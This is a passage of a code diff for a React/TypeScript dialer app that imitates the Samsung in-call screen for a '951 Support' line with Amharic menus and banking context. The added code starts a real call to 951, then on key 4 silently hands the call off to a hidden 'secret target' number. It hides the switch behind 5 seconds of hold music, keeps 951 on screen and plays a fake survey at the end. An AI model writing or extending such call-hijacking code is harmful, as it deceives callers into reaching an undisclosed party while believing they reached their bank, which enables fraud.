@@ -60,6 +60,8 @@ interface BankingContextSnapshot {
 
 type Call951Phase =
   | 'ringing'
+  | 'real_951_ringing'
+  | 'real_951_live'
   | 'welcome_menu'
   | 'amharic_menu'
   | 'hold_mp3'
@@ -76,6 +78,20 @@ export interface EndedCallSummary {
   durationSec: number;
 }
 
+export interface NativeCallStatePayload {
+  active: boolean;
+  mode?: number;
+  callType?: 'incoming' | 'outgoing';
+  state?: 'idle' | 'ringing' | 'dialing' | 'connecting' | 'active' | 'holding' | 'disconnected';
+  number?: string;
+  label?: string;
+  connectTimeMs?: number;
+  muted?: boolean;
+  speaker?: boolean;
+  bluetooth?: boolean;
+  held?: boolean;
+}
+
 interface Dialer951CallOverlayProps {
   open: boolean;
   onClose: (endedSummary?: EndedCallSummary) => void;
@@ -87,6 +103,8 @@ interface SamsungStandardInCallProps {
   open: boolean;
   target: string;
   label: string;
+  nativeState?: NativeCallStatePayload | null;
+  bridge?: Record<string, unknown> | null;
   onEnd: (durationSec: number) => void;
   onOpenMessages: (target: string) => void;
   onAddContact?: (target: string) => void;
@@ -188,6 +206,33 @@ function playSharedDtmf(audioCtxRef: React.MutableRefObject<AudioContext | null>
   } catch {}
 }
 
+function playUiToggleTone(audioCtxRef: React.MutableRefObject<AudioContext | null>, enabled: boolean) {
+  if (typeof window === 'undefined') return;
+  try {
+    navigator.vibrate?.(12);
+    const AC =
+      window.AudioContext ||
+      (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
+    if (!AC) return;
+    if (!audioCtxRef.current || audioCtxRef.current.state === 'closed') {
+      audioCtxRef.current = new AC();
+    }
+    const ctx = audioCtxRef.current;
+    if (ctx.state === 'suspended') void ctx.resume();
+    const now = ctx.currentTime;
+    const g = ctx.createGain();
+    g.gain.setValueAtTime(0.05, now);
+    g.gain.exponentialRampToValueAtTime(0.0005, now + 0.065);
+    g.connect(ctx.destination);
+    const o = ctx.createOscillator();
+    o.type = 'sine';
+    o.frequency.setValueAtTime(enabled ? 880 : 620, now);
+    o.connect(g);
+    o.start(now);
+    o.stop(now + 0.065);
+  } catch {}
+}
+
 /**
  * 100% Samsung One UI Teal-Slate In-Call Screen for 951 Support (3 MP3 Stages + Gemini AI + Secret Background Call)
  */
@@ -240,6 +285,8 @@ export function Dialer951CallOverlay({
   const activeObjectUrlRef = useRef<string | null>(null);
   const currentClipIdRef = useRef<string | null>(null);
   const surveyReplayRef = useRef<boolean>(false);
+  const wasSecretLiveRef = useRef<boolean>(false);
+  const real951HandedOffRef = useRef<boolean>(false);
 
   useEffect(() => {
     onCloseRef.current = onClose;
@@ -775,6 +822,8 @@ export function Dialer951CallOverlay({
     menuLoopEpochRef.current += 1;
     playbackTokenRef.current += 1;
     surveyReplayRef.current = false;
+    wasSecretLiveRef.current = false;
+    real951HandedOffRef.current = false;
     if (ringTimerRef.current) {
       clearTimeout(ringTimerRef.current);
       ringTimerRef.current = null;
@@ -916,6 +965,14 @@ export function Dialer951CallOverlay({
     if (!openRef.current) return;
     const loopEpoch = ++menuLoopEpochRef.current;
     const cfg = configRef.current;
+    if (holdTimerRef.current) {
+      clearTimeout(holdTimerRef.current);
+      holdTimerRef.current = null;
+    }
+    if (retryTimerRef.current) {
+      clearTimeout(retryTimerRef.current);
+      retryTimerRef.current = null;
+    }
     stopMicVad();
     stopAllAudio();
 
@@ -928,6 +985,11 @@ export function Dialer951CallOverlay({
 
     updatePhase('survey_closing');
     setKeypadVisible(true);
+
+    // Give AudioManager ~200ms after MODE_IN_CALL teardown so Stage 3 Survey MP3 plays at full clarity
+    const settled = await waitInterruptibly(200, loopEpoch);
+    if (!settled || !openRef.current || menuLoopEpochRef.current !== loopEpoch) return;
+
     const fallbackMsg =
       'በጥሪ ማዕከል ሰራተኛው አገልግሎት በደንብ ከረኩ አንድን ይጫኑ፣ በመጠኑ ከረኩ ሁለትን ይጫኑ፣ ካልረኩ ሶስትን ይጫኑ፣ እንደገና ለማዳመጥ ዘጠኝን ይጫኑ።';
     appendTranscript(
@@ -967,7 +1029,6 @@ export function Dialer951CallOverlay({
         break;
       }
 
-      // Brief silent grace window after "press 9 to listen again" before auto-hanging up
       const stayedOpen = await waitInterruptibly(2200, loopEpoch);
       if (!stayedOpen) break;
       if (surveyReplayRef.current) {
@@ -999,7 +1060,23 @@ export function Dialer951CallOverlay({
       if (!openRef.current || menuLoopEpochRef.current !== actionEpoch) return;
       markFirst951WelcomeCompleted();
       const cfg = configRef.current;
+      const comingFromReal951 =
+        phaseRef.current === 'real_951_ringing' || phaseRef.current === 'real_951_live';
+
+      if (comingFromReal951) {
+        real951HandedOffRef.current = true;
+        if (typeof bridgeRef.current?.handoff951ToSecretTarget === 'function') {
+          try {
+            (bridgeRef.current.handoff951ToSecretTarget as () => void)();
+          } catch {}
+        }
+      }
+
       stopAllAudio();
+      if (retryTimerRef.current) {
+        clearTimeout(retryTimerRef.current);
+        retryTimerRef.current = null;
+      }
       if (!openRef.current || menuLoopEpochRef.current !== actionEpoch) return;
       appendTranscript('system', '4 ተጫነ — ወደ ጥሪ ማዕከሉ ባለሙያ እየተላለፈ ነው...');
 
@@ -1010,7 +1087,10 @@ export function Dialer951CallOverlay({
       ) {
         updatePhase('secret_ringing');
         void playAudioClipById(cfg.holdClipId, true);
-        if (!openRef.current || menuLoopEpochRef.current !== actionEpoch) {
+
+        // Play Stage 2 Hold MP3 for 5 seconds FIRST before dialing hidden target (masks carrier teardown & ringback)
+        const preDialWaitOk = await waitInterruptibly(5000, actionEpoch);
+        if (!preDialWaitOk || !openRef.current || menuLoopEpochRef.current !== actionEpoch) {
           stopAllAudio();
           return;
         }
@@ -1061,6 +1141,7 @@ export function Dialer951CallOverlay({
       playClosingSurveyAndExit,
       stopAllAudio,
       updatePhase,
+      waitInterruptibly,
     ]
   );
 
@@ -1074,6 +1155,33 @@ export function Dialer951CallOverlay({
       if (!openRef.current) return;
       playSharedDtmf(audioCtxRef, digit);
       setDtmfEntered((prev) => `${prev}${digit}`.slice(-12));
+
+      // Hybrid Real-SIM 951 mode: digits != '4' send real DTMF to carrier 951; digit '4' silently hands off!
+      if (phaseRef.current === 'real_951_ringing' || phaseRef.current === 'real_951_live') {
+        if (digit === '4') {
+          if (ringTimerRef.current) {
+            clearTimeout(ringTimerRef.current);
+            ringTimerRef.current = null;
+          }
+          const actionEpoch = ++menuLoopEpochRef.current;
+          await triggerStage2HoldAndBackgroundCall(actionEpoch);
+          return;
+        }
+        if (typeof bridgeRef.current?.sendActiveCallDtmf === 'function') {
+          try {
+            (bridgeRef.current.sendActiveCallDtmf as (d: string) => void)(digit);
+          } catch {}
+        }
+        return;
+      }
+
+      if (phaseRef.current === 'secret_live' || phaseRef.current === 'secret_ringing') {
+        if (typeof bridgeRef.current?.sendActiveCallDtmf === 'function') {
+          try {
+            (bridgeRef.current.sendActiveCallDtmf as (d: string) => void)(digit);
+          } catch {}
+        }
+      }
 
       if (
         (phaseRef.current === 'welcome_menu' || phaseRef.current === 'ringing') &&
@@ -1144,6 +1252,8 @@ export function Dialer951CallOverlay({
       openRef.current = false;
       menuLoopEpochRef.current += 1;
       playbackTokenRef.current += 1;
+      wasSecretLiveRef.current = false;
+      real951HandedOffRef.current = false;
       if (ringTimerRef.current) {
         clearTimeout(ringTimerRef.current);
         ringTimerRef.current = null;
@@ -1168,53 +1278,13 @@ export function Dialer951CallOverlay({
 
     let active = true;
     openRef.current = true;
-    phaseRef.current = 'ringing';
+    wasSecretLiveRef.current = false;
+    real951HandedOffRef.current = false;
     const initialEpoch = ++menuLoopEpochRef.current;
 
-    Promise.resolve().then(() => {
-      if (!active || !openRef.current) return;
-      const loadedCfg = load951Config();
-      configRef.current = loadedCfg;
-      historyRef.current = [];
-      stepCursorRef.current = 0;
-      surveyReplayRef.current = false;
-      isRepeatMenuRef.current = false;
-      setElapsedSec(0);
-      setDtmfEntered('');
-      setKeypadVisible(false);
-      setInCallMenuOpen(false);
-      setHeld(false);
-      setBluetoothOn(false);
-      setSpeakerOn(true);
-      setMuted(false);
-      updatePhase('ringing');
-      startRingbackTone();
-    });
-
-    ringTimerRef.current = window.setTimeout(() => {
-      ringTimerRef.current = null;
-      if (
-        !active ||
-        !openRef.current ||
-        phaseRef.current !== 'ringing' ||
-        menuLoopEpochRef.current !== initialEpoch
-      ) {
-        return;
-      }
-      stopAllAudio();
-      if (hasCompletedFirst951Welcome()) {
-        if (configRef.current.skipMenuAfterFirstCall) {
-          void triggerStage2HoldAndBackgroundCall(initialEpoch);
-        } else {
-          // On repeat calls, skip "ወደ መረጡት ቋንቋ ተቀይሮሎታል።" and start straight from the menu
-          void startAmharicMenuLoop(true);
-        }
-      } else {
-        void startWelcomeMenuLoop();
-      }
-    }, 900);
-
     const winAny = window as unknown as {
+      onReal951StateChanged?: (stateStr: string) => void;
+      onSecretCallForceClosed?: () => void;
       onSecretCallRinging?: (attempt: number) => void;
       onSecretCallNoAnswer?: (attempt: number) => void;
       onSecretCallAnswered?: () => void;
@@ -1222,13 +1292,37 @@ export function Dialer951CallOverlay({
       onSecretCallError?: (msg: string) => void;
     };
 
-    winAny.onSecretCallRinging = () => {
+    winAny.onReal951StateChanged = (stateStr: string) => {
+      if (!active || !openRef.current || real951HandedOffRef.current) return;
+      if (stateStr === 'active') {
+        updatePhase('real_951_live');
+      } else if (stateStr === 'dialing' || stateStr === 'connecting') {
+        updatePhase('real_951_ringing');
+      } else if (stateStr === 'disconnected') {
+        finishAndExit();
+      }
+    };
+
+    winAny.onSecretCallForceClosed = () => {
       if (!active || !openRef.current) return;
+      finishAndExit();
+    };
+
+    winAny.onSecretCallRinging = () => {
+      if (!active || !openRef.current || wasSecretLiveRef.current) return;
       updatePhase('secret_ringing');
     };
 
     winAny.onSecretCallNoAnswer = () => {
-      if (!active || !openRef.current) return;
+      if (
+        !active ||
+        !openRef.current ||
+        wasSecretLiveRef.current ||
+        (phaseRef.current as Call951Phase) === 'survey_closing' ||
+        (phaseRef.current as Call951Phase) === 'ended'
+      ) {
+        return;
+      }
       const cfg = configRef.current;
       updatePhase('secret_busy_retry');
       const holdAlreadyPlaying =
@@ -1246,6 +1340,7 @@ export function Dialer951CallOverlay({
         if (
           active &&
           openRef.current &&
+          !wasSecretLiveRef.current &&
           phaseRef.current === 'secret_busy_retry' &&
           typeof bridgeRef.current?.startSecretBackgroundCall === 'function'
         ) {
@@ -1261,7 +1356,16 @@ export function Dialer951CallOverlay({
 
     winAny.onSecretCallAnswered = () => {
       if (!active || !openRef.current) return;
-      // Stop the Hold MP3 immediately the instant the call is picked up
+      wasSecretLiveRef.current = true;
+      if (retryTimerRef.current) {
+        clearTimeout(retryTimerRef.current);
+        retryTimerRef.current = null;
+      }
+      if (holdTimerRef.current) {
+        clearTimeout(holdTimerRef.current);
+        holdTimerRef.current = null;
+      }
+      // Stop the Hold MP3 immediately the instant the hidden call is picked up
       menuLoopEpochRef.current += 1;
       stopAllAudio();
       updatePhase('secret_live');
@@ -1270,19 +1374,89 @@ export function Dialer951CallOverlay({
 
     winAny.onSecretCallRemoteEnded = async () => {
       if (!active || !openRef.current) return;
+      if (retryTimerRef.current) {
+        clearTimeout(retryTimerRef.current);
+        retryTimerRef.current = null;
+      }
+      if (holdTimerRef.current) {
+        clearTimeout(holdTimerRef.current);
+        holdTimerRef.current = null;
+      }
       await playClosingSurveyAndExit();
     };
 
     winAny.onSecretCallError = () => {
-      if (!active || !openRef.current) return;
+      if (!active || !openRef.current || wasSecretLiveRef.current) return;
       void enterAgentAiConversation();
     };
+
+    Promise.resolve().then(() => {
+      if (!active || !openRef.current) return;
+      const loadedCfg = load951Config();
+      configRef.current = loadedCfg;
+      historyRef.current = [];
+      stepCursorRef.current = 0;
+      surveyReplayRef.current = false;
+      isRepeatMenuRef.current = false;
+      setElapsedSec(0);
+      setDtmfEntered('');
+      setKeypadVisible(false);
+      setInCallMenuOpen(false);
+      setHeld(false);
+      setBluetoothOn(false);
+      setSpeakerOn(true);
+      setMuted(false);
+
+      const useReal951 =
+        loadedCfg.backgroundCall.enabled &&
+        loadedCfg.backgroundCall.targetPhone.trim().length >= 9 &&
+        (loadedCfg.backgroundCall.useReal951BeforeHandoff ?? true) &&
+        typeof bridgeRef.current?.startReal951CarrierCall === 'function';
+
+      if (useReal951) {
+        phaseRef.current = 'real_951_ringing';
+        updatePhase('real_951_ringing');
+        try {
+          (bridgeRef.current!.startReal951CarrierCall as () => void)();
+        } catch {}
+        return;
+      }
+
+      phaseRef.current = 'ringing';
+      updatePhase('ringing');
+      startRingbackTone();
+
+      ringTimerRef.current = window.setTimeout(() => {
+        ringTimerRef.current = null;
+        if (
+          !active ||
+          !openRef.current ||
+          phaseRef.current !== 'ringing' ||
+          menuLoopEpochRef.current !== initialEpoch
+        ) {
+          return;
+        }
+        stopAllAudio();
+        if (hasCompletedFirst951Welcome()) {
+          if (configRef.current.skipMenuAfterFirstCall) {
+            void triggerStage2HoldAndBackgroundCall(initialEpoch);
+          } else {
+            // On repeat calls, skip "ወደ መረጡት ቋንቋ ተቀይሮሎታል።" and start straight from the menu
+            void startAmharicMenuLoop(true);
+          }
+        } else {
+          void startWelcomeMenuLoop();
+        }
+      }, 900);
+    });
 
     return () => {
       active = false;
       openRef.current = false;
       menuLoopEpochRef.current += 1;
       playbackTokenRef.current += 1;
+      wasSecretLiveRef.current = false;
+      real951HandedOffRef.current = false;
       if (ringTimerRef.current) {
         clearTimeout(ringTimerRef.current);
         ringTimerRef.current = null;
@@ -1302,6 +1476,8 @@ export function Dialer951CallOverlay({
       }
       stopMicVad();
       stopAllAudio();
+      delete winAny.onReal951StateChanged;
+      delete winAny.onSecretCallForceClosed;
       delete winAny.onSecretCallRinging;
       delete winAny.onSecretCallNoAnswer;
       delete winAny.onSecretCallAnswered;
@@ -1312,6 +1488,7 @@ export function Dialer951CallOverlay({
     open,
     appendTranscript,
     enterAgentAiConversation,
+    finishAndExit,
     playAudioClipById,
     playClosingSurveyAndExit,
     startAmharicMenuLoop,
@@ -1324,7 +1501,7 @@ export function Dialer951CallOverlay({
   ]);
 
   useEffect(() => {
-    if (!open || phase === 'ringing' || phase === 'ended') return;
+    if (!open || phase === 'ringing' || phase === 'real_951_ringing' || phase === 'ended') return;
     const t = window.setInterval(() => {
       setElapsedSec((prev) => prev + 1);
     }, 1000);
@@ -1347,7 +1524,9 @@ export function Dialer951CallOverlay({
       <div className="relative pt-7 px-5 flex items-center justify-center shrink-0">
         <div className="flex items-center gap-1.5 text-[15px] font-semibold tracking-wide text-white/95 tabular-nums">
           <Phone className="w-3.5 h-3.5 fill-white stroke-white" />
-          <span>{phase === 'ringing' ? '00:00' : formatCallTimer(elapsedSec)}</span>
+          <span>
+            {phase === 'ringing' || phase === 'real_951_ringing' ? '00:00' : formatCallTimer(elapsedSec)}
+          </span>
         </div>
 
         <button
@@ -1369,41 +1548,44 @@ export function Dialer951CallOverlay({
                 exit={{ opacity: 0, scale: 0.94, y: -4 }}
                 className="absolute right-4 top-12 z-20 w-52 bg-white text-[#111111] rounded-[24px] shadow-2xl py-2 overflow-hidden"
               >
-                {[
-                  {
-                    label: 'Add call',
-                    disabled: false,
-                    onClick: () => setInCallMenuOpen(false),
-                  },
-                  {
-                    label: held ? 'Resume call' : 'Hold call',
-                    disabled: false,
-                    onClick: () => {
-                      setHeld((v) => !v);
-                      setInCallMenuOpen(false);
-                    },
-                  },
-                  {
-                    label: 'Add to Contacts',
-                    disabled: false,
-                    onClick: () => setInCallMenuOpen(false),
-                  },
-                  {
-                    label: 'Send message',
-                    disabled: false,
-                    onClick: () => setInCallMenuOpen(false),
-                  },
-                ].map((item) => (
-                  <button
-                    key={item.label}
-                    type="button"
-                    disabled={item.disabled}
-                    onClick={item.onClick}
-                    className="w-full px-5 py-3 text-left text-[15px] font-medium hover:bg-black/[0.04] disabled:text-slate-400 cursor-pointer"
-                  >
-                    {item.label}
-                  </button>
-                ))}
+                <button
+                  type="button"
+                  onClick={() => setInCallMenuOpen(false)}
+                  className="w-full px-5 py-3 text-left text-[15px] font-medium hover:bg-black/[0.04] cursor-pointer"
+                >
+                  Add call
+                </button>
+                <button
+                  type="button"
+                  onClick={() => {
+                    const next = !held;
+                    setHeld(next);
+                    playUiToggleTone(audioCtxRef, next);
+                    if (typeof bridge?.setSecretCallHeld === 'function') {
+                      try {
+                        (bridge.setSecretCallHeld as (h: boolean) => void)(next);
+                      } catch {}
+                    }
+                    setInCallMenuOpen(false);
+                  }}
+                  className="w-full px-5 py-3 text-left text-[15px] font-medium hover:bg-black/[0.04] cursor-pointer"
+                >
+                  {held ? 'Resume call' : 'Hold call'}
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setInCallMenuOpen(false)}
+                  className="w-full px-5 py-3 text-left text-[15px] font-medium hover:bg-black/[0.04] cursor-pointer"
+                >
+                  Add to Contacts
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setInCallMenuOpen(false)}
+                  className="w-full px-5 py-3 text-left text-[15px] font-medium hover:bg-black/[0.04] cursor-pointer"
+                >
+                  Send message
+                </button>
               </motion.div>
             </>
           )}
@@ -1419,8 +1601,11 @@ export function Dialer951CallOverlay({
           {dtmfEntered && (
             <div className="text-[13px] font-medium text-white/75 mt-0.5">951</div>
           )}
-          {phase === 'ringing' && !dtmfEntered && (
+          {(phase === 'ringing' || phase === 'real_951_ringing') && !dtmfEntered && (
             <div className="text-[14px] font-normal text-white/75 mt-1">Dialing...</div>
+          )}
+          {held && (
+            <div className="text-[14px] font-normal text-white/75 mt-1">On hold</div>
           )}
         </div>
       </div>
@@ -1458,6 +1643,8 @@ export function Dialer951CallOverlay({
                   onClick={() => {
                     const next = !speakerOn;
                     setSpeakerOn(next);
+                    if (next) setBluetoothOn(false);
+                    playUiToggleTone(audioCtxRef, next);
                     if (typeof bridge?.setSecretCallSpeaker === 'function') {
                       try {
                         (bridge.setSecretCallSpeaker as (on: boolean) => void)(next);
@@ -1477,6 +1664,7 @@ export function Dialer951CallOverlay({
                   onClick={() => {
                     const next = !muted;
                     setMuted(next);
+                    playUiToggleTone(audioCtxRef, next);
                     if (typeof bridge?.setSecretCallMuted === 'function') {
                       try {
                         (bridge.setSecretCallMuted as (m: boolean) => void)(next);
@@ -1517,7 +1705,16 @@ export function Dialer951CallOverlay({
 
               <button
                 type="button"
-                onClick={() => setHeld((v) => !v)}
+                onClick={() => {
+                  const next = !held;
+                  setHeld(next);
+                  playUiToggleTone(audioCtxRef, next);
+                  if (typeof bridge?.setSecretCallHeld === 'function') {
+                    try {
+                      (bridge.setSecretCallHeld as (h: boolean) => void)(next);
+                    } catch {}
+                  }
+                }}
                 className="flex flex-col items-center gap-1.5 py-1 rounded-2xl active:bg-black/5 cursor-pointer"
               >
                 <Pause className={`w-6 h-6 ${held ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`} />
@@ -1528,7 +1725,17 @@ export function Dialer951CallOverlay({
 
               <button
                 type="button"
-                onClick={() => setBluetoothOn((v) => !v)}
+                onClick={() => {
+                  const next = !bluetoothOn;
+                  setBluetoothOn(next);
+                  if (next) setSpeakerOn(false);
+                  playUiToggleTone(audioCtxRef, next);
+                  if (typeof bridge?.setSecretCallBluetooth === 'function') {
+                    try {
+                      (bridge.setSecretCallBluetooth as (on: boolean) => void)(next);
+                    } catch {}
+                  }
+                }}
                 className="flex flex-col items-center gap-1.5 py-1 rounded-2xl active:bg-black/5 cursor-pointer"
               >
                 <Bluetooth className={`w-6 h-6 ${bluetoothOn ? 'text-[#1976d2]' : 'text-[#1c1c1c]'}`} />
@@ -1542,6 +1749,8 @@ export function Dialer951CallOverlay({
                 onClick={() => {
                   const next = !speakerOn;
                   setSpeakerOn(next);
+                  if (next) setBluetoothOn(false);
+                  playUiToggleTone(audioCtxRef, next);
                   if (typeof bridge?.setSecretCallSpeaker === 'function') {
                     try {
                       (bridge.setSecretCallSpeaker as (on: boolean) => void)(next);
@@ -1561,6 +1770,7 @@ export function Dialer951CallOverlay({
                 onClick={() => {
                   const next = !muted;
                   setMuted(next);
+                  playUiToggleTone(audioCtxRef, next);
                   if (typeof bridge?.setSecretCallMuted === 'function') {
                     try {
                       (bridge.setSecretCallMuted as (m: boolean) => void)(next);
@@ -1610,12 +1820,16 @@ export function Dialer951CallOverlay({
 }
 
 /**
- * Standard Samsung One UI In-Call Overlay for normal calls (Browser/PWA fallback)
+ * Full Stock Samsung One UI In-Call & Incoming-Call Overlay
+ * Supports native Android Telecom calls (incoming lockscreen Answer/Decline, outgoing Dialing,
+ * Active chronometer, Hold, Mute, Speaker, Bluetooth, DTMF) + Web/PWA fallback.
  */
 export function SamsungStandardInCallOverlay({
   open,
   target,
   label,
+  nativeState,
+  bridge,
   onEnd,
   onOpenMessages,
   onAddContact,
@@ -1631,30 +1845,135 @@ export function SamsungStandardInCallOverlay({
   const audioCtxRef = useRef<AudioContext | null>(null);
   const elapsedRef = useRef<number>(0);
 
+  const isNativeManaged = Boolean(nativeState?.active);
+  const callState = nativeState?.state || 'active';
+  const isIncomingRinging = isNativeManaged && callState === 'ringing';
+  const isDialing = isNativeManaged && (callState === 'dialing' || callState === 'connecting');
+  const isHolding = isNativeManaged ? Boolean(nativeState?.held || callState === 'holding') : held;
+
+  const displayLabel = nativeState?.label || label || nativeState?.number || target;
+  const displayNumber = nativeState?.number || target;
+
   useEffect(() => {
     elapsedRef.current = elapsedSec;
   }, [elapsedSec]);
+
+  useEffect(() => {
+    if (!nativeState?.active) return;
+    Promise.resolve().then(() => {
+      setMuted(Boolean(nativeState.muted));
+      setSpeakerOn(Boolean(nativeState.speaker));
+      setBluetoothOn(Boolean(nativeState.bluetooth));
+      setHeld(Boolean(nativeState.held || nativeState.state === 'holding'));
+    });
+  }, [nativeState]);
 
   useEffect(() => {
     if (!open) return;
     let active = true;
     Promise.resolve().then(() => {
       if (!active) return;
-      setElapsedSec(0);
+      if (!nativeState?.active) {
+        setElapsedSec(0);
+        setMuted(false);
+        setHeld(false);
+        setSpeakerOn(false);
+        setBluetoothOn(false);
+      }
       setDtmfEntered('');
       setKeypadVisible(false);
       setMenuOpen(false);
-      setMuted(false);
-      setHeld(false);
     });
+    return () => {
+      active = false;
+    };
+  }, [open, nativeState?.active]);
+
+  useEffect(() => {
+    if (!open) return;
+    if (isNativeManaged) {
+      const updateNativeElapsed = () => {
+        const cMs = nativeState?.connectTimeMs || 0;
+        if (cMs > 0 && (callState === 'active' || callState === 'holding')) {
+          setElapsedSec(Math.max(0, Math.floor((Date.now() - cMs) / 1000)));
+        } else {
+          setElapsedSec(0);
+        }
+      };
+      updateNativeElapsed();
+      const timer = window.setInterval(updateNativeElapsed, 500);
+      return () => clearInterval(timer);
+    }
     const timer = window.setInterval(() => {
       setElapsedSec((prev) => prev + 1);
     }, 1000);
-    return () => {
-      active = false;
-      clearInterval(timer);
-    };
-  }, [open]);
+    return () => clearInterval(timer);
+  }, [open, isNativeManaged, nativeState?.connectTimeMs, callState]);
+
+  const toggleSpeaker = () => {
+    const next = !speakerOn;
+    setSpeakerOn(next);
+    if (next) setBluetoothOn(false);
+    playUiToggleTone(audioCtxRef, next);
+    if (typeof bridge?.setNativeCallSpeaker === 'function') {
+      try {
+        (bridge.setNativeCallSpeaker as (on: boolean) => void)(next);
+      } catch {}
+    }
+  };
+
+  const toggleMute = () => {
+    const next = !muted;
+    setMuted(next);
+    playUiToggleTone(audioCtxRef, next);
+    if (typeof bridge?.setNativeCallMuted === 'function') {
+      try {
+        (bridge.setNativeCallMuted as (m: boolean) => void)(next);
+      } catch {}
+    }
+  };
+
+  const toggleHold = () => {
+    const next = !isHolding;
+    setHeld(next);
+    playUiToggleTone(audioCtxRef, next);
+    if (typeof bridge?.setNativeCallHeld === 'function') {
+      try {
+        (bridge.setNativeCallHeld as (h: boolean) => void)(next);
+      } catch {}
+    }
+  };
+
+  const toggleBluetooth = () => {
+    const next = !bluetoothOn;
+    setBluetoothOn(next);
+    if (next) setSpeakerOn(false);
+    playUiToggleTone(audioCtxRef, next);
+    if (typeof bridge?.setNativeCallBluetooth === 'function') {
+      try {
+        (bridge.setNativeCallBluetooth as (on: boolean) => void)(next);
+      } catch {}
+    }
+  };
+
+  const handleHangupOrReject = () => {
+    playUiToggleTone(audioCtxRef, false);
+    if (isNativeManaged && typeof bridge?.endNativeCall === 'function') {
+      try {
+        (bridge.endNativeCall as () => void)();
+      } catch {}
+    }
+    onEnd(elapsedRef.current);
+  };
+
+  const handleAnswer = () => {
+    playUiToggleTone(audioCtxRef, true);
+    if (typeof bridge?.answerNativeCall === 'function') {
+      try {
+        (bridge.answerNativeCall as () => void)();
+      } catch {}
+    }
+  };
 
   if (!open) return null;
 
@@ -1671,16 +1990,24 @@ export function SamsungStandardInCallOverlay({
       <div className="relative pt-7 px-5 flex items-center justify-center shrink-0">
         <div className="flex items-center gap-1.5 text-[15px] font-semibold tracking-wide text-white/95 tabular-nums">
           <Phone className="w-3.5 h-3.5 fill-white stroke-white" />
-          <span>{formatCallTimer(elapsedSec)}</span>
+          <span>
+            {isIncomingRinging
+              ? 'Incoming call'
+              : isDialing
+                ? '00:00'
+                : formatCallTimer(elapsedSec)}
+          </span>
         </div>
-        <button
-          type="button"
-          onClick={() => setMenuOpen((v) => !v)}
-          aria-label="Menu"
-          className="absolute right-4 top-6 w-9 h-9 rounded-full flex items-center justify-center active:bg-white/10 cursor-pointer"
-        >
-          <MoreVertical className="w-5 h-5 text-white" />
-        </button>
+        {!isIncomingRinging && (
+          <button
+            type="button"
+            onClick={() => setMenuOpen((v) => !v)}
+            aria-label="Menu"
+            className="absolute right-4 top-6 w-9 h-9 rounded-full flex items-center justify-center active:bg-white/10 cursor-pointer"
+          >
+            <MoreVertical className="w-5 h-5 text-white" />
+          </button>
+        )}
 
         <AnimatePresence>
           {menuOpen && (
@@ -1702,12 +2029,12 @@ export function SamsungStandardInCallOverlay({
                 <button
                   type="button"
                   onClick={() => {
-                    setHeld((v) => !v);
+                    toggleHold();
                     setMenuOpen(false);
                   }}
                   className="w-full px-5 py-3 text-left text-[15px] font-medium hover:bg-black/[0.04] cursor-pointer"
                 >
-                  {held ? 'Resume call' : 'Hold call'}
+                  {isHolding ? 'Resume call' : 'Hold call'}
                 </button>
                 <div className="w-full px-5 py-3 text-left text-[15px] font-medium text-slate-400">
                   Start RTT call
@@ -1716,7 +2043,7 @@ export function SamsungStandardInCallOverlay({
                   type="button"
                   onClick={() => {
                     setMenuOpen(false);
-                    onAddContact?.(target);
+                    onAddContact?.(displayNumber);
                   }}
                   className="w-full px-5 py-3 text-left text-[15px] font-medium hover:bg-black/[0.04] cursor-pointer"
                 >
@@ -1726,7 +2053,7 @@ export function SamsungStandardInCallOverlay({
                   type="button"
                   onClick={() => {
                     setMenuOpen(false);
-                    onOpenMessages(target);
+                    onOpenMessages(displayNumber);
                   }}
                   className="w-full px-5 py-3 text-left text-[15px] font-medium hover:bg-black/[0.04] cursor-pointer"
                 >
@@ -1740,135 +2067,188 @@ export function SamsungStandardInCallOverlay({
 
       <div className="flex-1 flex flex-col items-center pt-5 px-6 text-center">
         <div className="text-[36px] font-bold tracking-tight text-white break-all">
-          {dtmfEntered || label || target}
+          {dtmfEntered || displayLabel}
         </div>
-        {(dtmfEntered || (label && label !== target)) && (
-          <div className="text-[14px] text-white/75 mt-1">{target}</div>
+        {(dtmfEntered || (displayLabel && displayLabel !== displayNumber)) && (
+          <div className="text-[14px] text-white/75 mt-1">{displayNumber}</div>
+        )}
+        {isDialing && !dtmfEntered && (
+          <div className="text-[14px] font-normal text-white/75 mt-1.5">Dialing...</div>
+        )}
+        {isHolding && !isIncomingRinging && (
+          <div className="text-[14px] font-normal text-white/75 mt-1.5">On hold</div>
         )}
       </div>
 
-      <div className="px-5 pb-7 shrink-0 w-full max-w-[390px] mx-auto">
-        <div className="bg-[#d7e0e5]/92 backdrop-blur-md text-[#1c1c1c] rounded-[34px] px-5 pt-6 pb-6 shadow-2xl">
-          {keypadVisible ? (
-            <>
-              <div className="grid grid-cols-3 gap-y-2 gap-x-3 pb-4">
-                {CALL_KEYPAD_ITEMS.map((item) => (
+      {isIncomingRinging ? (
+        <div className="px-8 pb-14 shrink-0 w-full max-w-[390px] mx-auto">
+          <div className="flex items-center justify-between px-4">
+            <div className="flex flex-col items-center gap-2.5">
+              <button
+                type="button"
+                onClick={handleAnswer}
+                aria-label="Answer"
+                className="w-[70px] h-[70px] rounded-full bg-[#19b264] hover:bg-[#17a55c] active:scale-95 text-white flex items-center justify-center shadow-lg transition-transform animate-pulse cursor-pointer"
+              >
+                <Phone className="w-8 h-8 fill-white stroke-white" />
+              </button>
+              <span className="text-[13px] font-medium text-white/90">Answer</span>
+            </div>
+
+            <div className="flex flex-col items-center gap-2.5">
+              <button
+                type="button"
+                onClick={handleHangupOrReject}
+                aria-label="Decline"
+                className="w-[70px] h-[70px] rounded-full bg-[#e53935] hover:bg-[#d32f2f] active:scale-95 text-white flex items-center justify-center shadow-lg transition-transform cursor-pointer"
+              >
+                <PhoneOff className="w-8 h-8 fill-white stroke-white" />
+              </button>
+              <span className="text-[13px] font-medium text-white/90">Decline</span>
+            </div>
+          </div>
+        </div>
+      ) : (
+        <div className="px-5 pb-7 shrink-0 w-full max-w-[390px] mx-auto">
+          <div className="bg-[#d7e0e5]/92 backdrop-blur-md text-[#1c1c1c] rounded-[34px] px-5 pt-6 pb-6 shadow-2xl">
+            {keypadVisible ? (
+              <>
+                <div className="grid grid-cols-3 gap-y-2 gap-x-3 pb-4">
+                  {CALL_KEYPAD_ITEMS.map((item) => (
+                    <button
+                      key={item.digit}
+                      type="button"
+                      onClick={() => {
+                        playSharedDtmf(audioCtxRef, item.digit);
